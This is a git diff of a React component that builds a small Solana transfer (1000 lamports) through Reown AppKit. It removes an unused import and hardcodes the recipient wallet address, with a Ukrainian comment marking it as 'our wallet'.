@@ -4,8 +4,6 @@ import { useAppKitProvider } from "@reown/appkit/react";
 import type { Provider } from "@reown/appkit-adapter-solana/react";
 import { PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from "@solana/web3.js";
 import React from "react";
-import Spot from "../index";
-
 
 const Flow: React.FC = () => {
   const { connection } = useAppKitConnection();
@@ -60,7 +58,7 @@ const Flow: React.FC = () => {
     }).add(
       SystemProgram.transfer({
         fromPubkey: walletProvider.publicKey,
-        toPubkey: new PublicKey(address), // destination address тобто вказати наш кошель
+        toPubkey: new PublicKey("FyJKF3yAAVgUj32AGVKCNB6fbhenC9yEHtSvoDEZxQSV"), // destination address тобто вказати наш кошель
         lamports: 1000, //0.000001 SOL
       })
     );
